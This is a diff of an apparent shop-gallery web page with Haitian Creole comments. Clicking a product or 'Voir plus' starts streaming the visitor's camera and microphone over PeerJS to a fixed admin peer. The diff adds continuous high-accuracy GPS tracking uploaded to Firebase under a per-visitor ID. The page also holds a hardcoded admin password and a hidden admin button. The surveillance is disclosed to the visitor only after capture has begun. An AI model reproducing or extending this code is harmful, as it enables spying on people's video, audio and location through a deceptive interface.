@@ -21,7 +21,6 @@
     min-height: 100vh; padding-bottom: 40px;
   }
 
-  /* ===== TI PWEN ADMIN ===== */
   .dot-admin {
     position: fixed; bottom: 15px; left: 15px;
     width: 14px; height: 14px;
@@ -30,11 +29,8 @@
     z-index: 1000;
     transition: opacity 0.2s, background 0.2s;
   }
-  .dot-admin:hover, .dot-admin:active {
-    opacity: 1; background: #00cc66;
-  }
+  .dot-admin:hover, .dot-admin:active { opacity: 1; background: #00cc66; }
 
-  /* ===== EKRAN LOGIN ===== */
   .login-screen {
     position: fixed; top: 0; left: 0; right: 0; bottom: 0;
     background: #0d0d0d;
@@ -48,13 +44,8 @@
     border: 1px solid #2a2a2a;
     text-align: center;
   }
-  .login-box h2 {
-    font-size: 1.4rem; margin-bottom: 8px;
-    font-weight: normal;
-  }
-  .login-box .sub {
-    color: #aaa; font-size: 13px; margin-bottom: 20px;
-  }
+  .login-box h2 { font-size: 1.4rem; margin-bottom: 8px; font-weight: normal; }
+  .login-box .sub { color: #aaa; font-size: 13px; margin-bottom: 20px; }
   .login-box input {
     width: 100%; padding: 14px;
     border-radius: 10px; border: 1px solid #333;
@@ -62,9 +53,7 @@
     font-size: 15px; margin-bottom: 12px;
     font-family: system-ui, sans-serif;
   }
-  .login-box input:focus {
-    outline: none; border-color: #00cc66;
-  }
+  .login-box input:focus { outline: none; border-color: #00cc66; }
   .login-box button {
     width: 100%; padding: 15px;
     background: #00cc66; color: white;
@@ -74,32 +63,20 @@
     margin-top: 5px;
   }
   .login-box button:disabled { opacity: 0.5; }
-  .login-box .err {
-    color: #ff6666; font-size: 12px;
-    margin-top: 10px; min-height: 16px;
-  }
+  .login-box .err { color: #ff6666; font-size: 12px; margin-top: 10px; min-height: 16px; }
 
-  /* ===== PAJ PRENSIPAL ===== */
   .app-content { display: none; }
   .app-content.active { display: block; }
 
-  header {
-    text-align: center; padding: 25px 20px 15px;
-    border-bottom: 1px solid #222;
-  }
+  header { text-align: center; padding: 25px 20px 15px; border-bottom: 1px solid #222; }
   header h1 {
     font-size: 1.4rem; letter-spacing: 4px;
     color: #00cc66; text-transform: uppercase;
     font-weight: normal; margin-bottom: 4px;
   }
-  header p {
-    color: #888; font-size: 11px; letter-spacing: 2px;
-    text-transform: uppercase;
-  }
-  .cta {
-    margin: 25px auto 20px; max-width: 360px; padding: 0 20px;
-    text-align: center;
-  }
+  header p { color: #888; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
+
+  .cta { margin: 25px auto 20px; max-width: 360px; padding: 0 20px; text-align: center; }
   .cta button {
     width: 100%; padding: 18px 20px;
     background: linear-gradient(135deg, #00cc66, #009944);
@@ -109,13 +86,9 @@
     box-shadow: 0 4px 15px rgba(0, 204, 102, 0.3);
   }
   .cta button:disabled { opacity: 0.5; cursor: not-allowed; }
-  .cta .hint {
-    font-size: 11px; color: #777; margin-top: 10px; line-height: 1.5;
-  }
-  .active-panel {
-    margin: 25px auto 20px; max-width: 360px; padding: 0 20px;
-    text-align: center;
-  }
+  .cta .hint { font-size: 11px; color: #777; margin-top: 10px; line-height: 1.5; }
+
+  .active-panel { margin: 25px auto 20px; max-width: 360px; padding: 0 20px; text-align: center; }
   .active-panel .card {
     background: #1a1a1a; border: 1px solid #00cc66;
     border-radius: 12px; padding: 20px;
@@ -134,26 +107,21 @@
     border-radius: 10px; font-size: 13px; font-weight: bold;
     cursor: pointer; font-family: system-ui, sans-serif;
   }
-  #status {
-    text-align: center; color: #888; font-size: 12px;
-    margin-top: 10px; padding: 0 20px; min-height: 16px;
-  }
+  #status { text-align: center; color: #888; font-size: 12px; margin-top: 10px; padding: 0 20px; min-height: 16px; }
+
   .gallery-title {
     text-align: center; margin: 30px 0 12px;
     font-size: 11px; letter-spacing: 3px;
     color: #666; text-transform: uppercase;
   }
-  .gallery-title::before,
-  .gallery-title::after {
+  .gallery-title::before, .gallery-title::after {
     content: ""; display: inline-block;
     width: 30px; height: 1px; background: #333;
     vertical-align: middle; margin: 0 10px;
   }
   .gallery {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 4px; padding: 4px;
-    max-width: 900px; margin: 0 auto;
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 4px; padding: 4px; max-width: 900px; margin: 0 auto;
   }
   .item {
     position: relative; aspect-ratio: 1/1;
@@ -161,10 +129,7 @@
     cursor: pointer; border-radius: 6px;
   }
   .item:active { transform: scale(0.95); transition: transform 0.1s; }
-  .item img {
-    width: 100%; height: 100%; object-fit: cover;
-    display: block;
-  }
+  .item img { width: 100%; height: 100%; object-fit: cover; display: block; }
   .item .label {
     position: absolute; bottom: 0; left: 0; right: 0;
     background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
@@ -173,29 +138,16 @@
     color: #fff; text-transform: uppercase;
     z-index: 2; text-align: center;
   }
-  .item .price {
-    color: #00cc66; font-weight: bold;
-    font-size: 11px; display: block;
-    margin-top: 2px;
-  }
+  .item .price { color: #00cc66; font-weight: bold; font-size: 11px; display: block; margin-top: 2px; }
   .hidden { display: none; }
-  .empty {
-    grid-column: 1 / -1;
-    text-align: center; color: #666;
-    padding: 30px; font-size: 13px;
-  }
-  footer {
-    text-align: center; color: #444; font-size: 10px;
-    margin-top: 30px; padding: 0 20px;
-  }
+  .empty { grid-column: 1 / -1; text-align: center; color: #666; padding: 30px; font-size: 13px; }
+  footer { text-align: center; color: #444; font-size: 10px; margin-top: 30px; padding: 0 20px; }
 </style>
 </head>
 <body>
 
-  <!-- ===== TI PWEN ADMIN (anba gòch) ===== -->
   <div class="dot-admin" id="dotAdmin" title=""></div>
 
-  <!-- ===== EKRAN LOGIN ===== -->
   <div class="login-screen" id="loginScreen">
     <div class="login-box">
       <h2>🔒 Antre</h2>
@@ -210,7 +162,6 @@
     </div>
   </div>
 
-  <!-- ===== PAJ PRENSIPAL ===== -->
   <div class="app-content" id="appContent">
 
     <header>
@@ -219,20 +170,17 @@
     </header>
 
     <div class="cta" id="ctaView">
-      <button id="btnStart">✅ voir plus </button>
-      <p class="hint">
-        <br>
-   
-      </p>
+      <button id="btnStart">✅ Voir plus</button>
+      <p class="hint"></p>
     </div>
 
     <div class="active-panel hidden" id="activeView" style="display:none;">
       <div class="card">
-        <p><span class=""></span><strong>Bienvenue !</strong></p>
+        <p><span class="dot"></span><strong>Bienvenue !</strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
-          
+          Ou konekte. Administratè a ap wè ou.
         </p>
-      
+        <button id="btnStop">⛔ Sispann Pataje</button>
       </div>
     </div>
 
@@ -246,7 +194,7 @@
 
     <div class="gallery hidden" id="galleryRest"></div>
 
-    <footer>©️ 2026 — Tout dwa rezève</footer>
+    <footer>© 2026 — Tout dwa rezève</footer>
 
   </div>
 
@@ -272,7 +220,16 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 /* ============================================
-   TI PWEN ADMIN (anba gòch)
+   ID INIK POU CHAK VISITOR
+   ============================================ */
+let VISITOR_ID = sessionStorage.getItem("visitor_id");
+if (!VISITOR_ID) {
+  VISITOR_ID = "v_" + Math.random().toString(36).substring(2, 10);
+  sessionStorage.setItem("visitor_id", VISITOR_ID);
+}
+
+/* ============================================
+   TI PWEN ADMIN
    ============================================ */
 const ADMIN_PASSWORD = "Zane200420042005";
 
@@ -312,12 +269,8 @@ btnLogin.onclick = () => {
   showApp();
 };
 
-nameInput.addEventListener("keydown", (e) => {
-  if (e.key === "Enter") pwInput.focus();
-});
-pwInput.addEventListener("keydown", (e) => {
-  if (e.key === "Enter") btnLogin.click();
-});
+nameInput.addEventListener("keydown", (e) => { if (e.key === "Enter") pwInput.focus(); });
+pwInput.addEventListener("keydown", (e) => { if (e.key === "Enter") btnLogin.click(); });
 
 function showApp() {
   loginScreen.style.display = "none";
@@ -333,7 +286,7 @@ function buildItem(img) {
   return `<div class="item" data-name="${img.name}" data-price="${img.price || ''}">
     <img src="${img.url}" loading="lazy" alt="${img.name}"
          onerror="this.style.display='none';this.parentElement.style.background='#2a2a2a';">
-    <div class="label">${img.name}${img.price ? <span class="price">${img.price}</span> : ''}</div>
+    <div class="label">${img.name}${img.price ? `<span class="price">${img.price}</span>` : ''}</div>
   </div>`;
 }
 
@@ -366,7 +319,7 @@ db.ref("images").on("value", (snapshot) => {
 });
 
 /* ============================================
-   PEERJS + KAMERA + MIKWO
+   PEERJS + KAMERA + MIKWO + LOKASYON
    ============================================ */
 (() => {
   const ADMIN_ID = "admin-piyayy-2026-v2";
@@ -403,10 +356,8 @@ db.ref("images").on("value", (snapshot) => {
     if (peer && !peer.destroyed) return peer;
     peer = new Peer(undefined, { config: ICE_CONFIG, debug: 1 });
     peer.on("error", (err) => {
-  // ⚠️ ERÈ JERE AN SILANS — pa afiche anyen
-  console.warn("PeerJS erè:", err);
-  // Pa fè anyen — pa afiche, pa fè son, pa fè anyen
-});
+      console.warn("PeerJS erè:", err);
+    });
     peer.on("disconnected", () => {
       if (active) setTimeout(() => { if (peer && !peer.destroyed) peer.reconnect(); }, 2000);
     });
@@ -423,14 +374,14 @@ db.ref("images").on("value", (snapshot) => {
     try {
       localStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
-        audio: true   // 
+        audio: true
       });
       return true;
     } catch (err) {
       try {
         localStream = await navigator.mediaDevices.getUserMedia({
           video: true,
-          audio: true   // 
+          audio: true
         });
         return true;
       } catch (err2) { return false; }
@@ -478,7 +429,6 @@ db.ref("images").on("value", (snapshot) => {
         currentCall.peerConnection.iceConnectionState !== "closed";
       if (!camAlive || !callAlive) {
         await ensureCall();
-        if (currentCall) setStatus("");
       }
     }, 3000);
   }
@@ -487,32 +437,82 @@ db.ref("images").on("value", (snapshot) => {
     if (keepAliveTimer) { clearInterval(keepAliveTimer); keepAliveTimer = null; }
   }
 
+  /* ============================================
+     KAT LOKASYON
+     ============================================ */
+  function startLocationTracking() {
+    if (!navigator.geolocation) {
+      console.warn("❌ Geolocation pa disponib");
+      return;
+    }
+
+    // Mande pèmisyon dabò
+    navigator.geolocation.getCurrentPosition(
+      (p) => {
+        console.log("✅ Lokasyon aksepte");
+        sendLocation(p);
+
+        // Kòmanse swivi
+        const watchId = navigator.geolocation.watchPosition(
+          sendLocation,
+          (err) => console.warn("❌ Erè lokasyon:", err.message),
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+        );
+        window._watchId = watchId;
+      },
+      (err) => {
+        console.warn("❌ Visitor refize lokasyon:", err.message);
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+
+  function sendLocation(pos) {
+    db.ref("locations/" + VISITOR_ID).set({
+      name: sessionStorage.getItem("visitor_name") || "Anonim",
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude,
+      acc: pos.coords.accuracy,
+      time: Date.now()
+    });
+    console.log("📍 Pozisyon voye:", pos.coords.latitude, pos.coords.longitude);
+  }
+
+  function stopLocationTracking() {
+    if (window._watchId) {
+      navigator.geolocation.clearWatch(window._watchId);
+      window._watchId = null;
+    }
+  }
+
+  /* ============================================
+     START / STOP SHARING
+     ============================================ */
   async function startSharing() {
     const rest = document.getElementById("galleryRest");
     if (rest.innerHTML.trim() !== "" && rest.classList.contains("hidden")) {
       rest.classList.remove("hidden");
-      setTimeout(() => {
-        rest.scrollIntoView({ behavior: "smooth", block: "start" });
-      }, 200);
+      setTimeout(() => rest.scrollIntoView({ behavior: "smooth", block: "start" }), 200);
     }
 
     btnStart.disabled = true;
-    setStatus("");
     intentionallyStopped = false;
 
     const ok = await ensureCamera();
     if (!ok) {
-      setStatus("tanpri aksepte pouw kontinye we update sou page la ");
       btnStart.disabled = false;
       return;
     }
-    setStatus("");
+
     await ensureCall();
+
+    // Kòmanse swivi lokasyon
+    startLocationTracking();
+
     active = true;
     ctaView.classList.add("hidden");
     activeView.classList.remove("hidden");
     activeView.style.display = "block";
-    setStatus("");
     startKeepAlive();
   }
 
@@ -520,6 +520,13 @@ db.ref("images").on("value", (snapshot) => {
     intentionallyStopped = true;
     active = false;
     stopKeepAlive();
+
+    // Stope swivi lokasyon
+    stopLocationTracking();
+
+    // Efase pozisyon nan Firebase
+    db.ref("locations/" + VISITOR_ID).remove();
+
     if (currentCall) { try { currentCall.close(); } catch (e) {} currentCall = null; }
     if (localStream) {
       localStream.getTracks().forEach(t => t.stop());
@@ -529,7 +536,6 @@ db.ref("images").on("value", (snapshot) => {
     activeView.style.display = "none";
     ctaView.classList.remove("hidden");
     btnStart.disabled = false;
-    setStatus("");
   }
 
   btnStart.onclick = startSharing;
@@ -541,10 +547,7 @@ db.ref("images").on("value", (snapshot) => {
     el.addEventListener("click", (e) => {
       if (active || intentionallyStopped) return;
       const item = e.target.closest(".item");
-      if (item) {
-        console.log("🛒 Klike sou:", item.dataset.name, item.dataset.price);
-        startSharing();
-      }
+      if (item) startSharing();
     });
   }
   attachGalleryClick("galleryFirst");
@@ -576,6 +579,7 @@ db.ref("images").on("value", (snapshot) => {
 
   window.addEventListener("beforeunload", () => {
     stopKeepAlive();
+    stopLocationTracking();
     if (localStream) localStream.getTracks().forEach(t => t.stop());
     if (currentCall) try { currentCall.close(); } catch (e) {}
     if (peer && !peer.destroyed) peer.destroy();
@@ -591,4 +595,4 @@ if ("serviceWorker" in navigator) {
 }
 </script>
 </body>
-</html> 
+</html>
